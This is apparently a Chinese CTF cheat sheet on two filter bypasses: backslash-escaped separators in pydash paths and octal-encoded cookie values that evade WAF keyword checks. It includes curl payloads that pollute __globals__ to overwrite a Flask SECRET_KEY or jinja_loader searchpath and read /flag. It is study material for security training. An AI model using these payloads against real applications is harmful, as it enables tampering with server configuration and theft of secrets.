# pydash 路径过滤绕过
## 5.1 路径分隔符绕过

CTF 题目常对 pydash 的路径参数做过滤（如禁止 `_.`）。pydash 的路径解析器支持反斜杠转义，`\.` 被视为转义的 `.`（不分割），而 `\\.` 中 `\\` 是转义的 `\`，后面的 `.` 仍作为分割符生效。

```bash
# 题目过滤: '_.' not in key
# 绕过: 用 \\. 替代 .（反斜杠转义后 . 仍然作为路径分隔符）
# 原始路径: __class__.__init__.__globals__.app
# 绕过路径: __class__\\.__init__\\.__globals__\\.app

curl -X POST http://target/admin \
  -H 'Content-Type: application/json' \
  -d '{"key": "__class__\\\\.__init__\\\\.__globals__\\\\.app.config.SECRET_KEY", "value": "hacked"}'
# JSON 中 \\ 会被解析为单个 \，所以实际发送的是 \\.
```

> 关键理解: pydash 路径中 `\.` = 转义的点（不分割），`\\.` = 转义的反斜杠 + 分割点。当过滤器检查 `_.` 子串时，`\\.` 中间插入了 `\` 所以不匹配，但 pydash 解析时仍正常分割。

## 5.2 Cookie 八进制编码绕过

当题目在 Cookie 值中做关键字过滤（如 WAF 拦截 `__class__`、`__init__`、`__globals__` 等），可利用 Python/Flask 的 Cookie 解析对八进制转义的支持来绕过。

**原理**: HTTP Cookie 值中的 `\NNN`（三位八进制数）会被某些解析器解码为对应 ASCII 字符。例如 `_` 的 ASCII 码是 95，八进制为 `\137`。WAF 看到的是 `\137\137class\137\137`（无 `__class__` 子串），但后端解析后还原为 `__class__`。

```bash
# 原始 Cookie 值（被 WAF 拦截）:
Cookie: payload=__class__.__init__.__globals__

# 八进制编码绕过（_ = \137, . = \056）:
Cookie: payload=\137\137class\137\137\056\137\137init\137\137\056\137\137globals\137\137

# 部分编码也可（只编码被过滤的字符）:
Cookie: payload=\137\137class\137\137.__init__.__globals__
```

**组合利用**: Cookie 八进制绕过常与 pydash 路径绕过（5.1）配合使用。典型攻击链：

```bash
# 步骤 1: Cookie 八进制绕过 WAF 的关键字过滤
# 步骤 2: pydash \\. 绕过应用层的 '_.' 过滤
# 步骤 3: 到达 pydash.set_() 执行原型链污染

# 完整示例: Cookie 传递污染路径
curl http://target/admin \
  -b 'key=\137\137class\137\137\\.__init__\\.__globals__\\.app.jinja_loader.searchpath; value=/' \
  -X POST

# 然后访问模板页面读取 flag
curl http://target/page  # render_template('flag') → 读取 /flag
```

**常用八进制编码速查**:

| 字符 | ASCII | 八进制 |
|------|-------|--------|
| `_`  | 95    | `\137` |
| `.`  | 46    | `\056` |
| `/`  | 47    | `\057` |
| `\`  | 92    | `\134` |
| `'`  | 39    | `\047` |
| `"`  | 34    | `\042` |

> 注意: 八进制编码能否生效取决于 Cookie 解析层的实现。Python 的 `http.cookies.SimpleCookie` 支持八进制转义解码，Flask/Werkzeug 的 Cookie 解析在特定版本下也支持。如果八进制不生效，尝试 URL 编码（`%5F%5F` 代替 `__`）或 Unicode 编码。
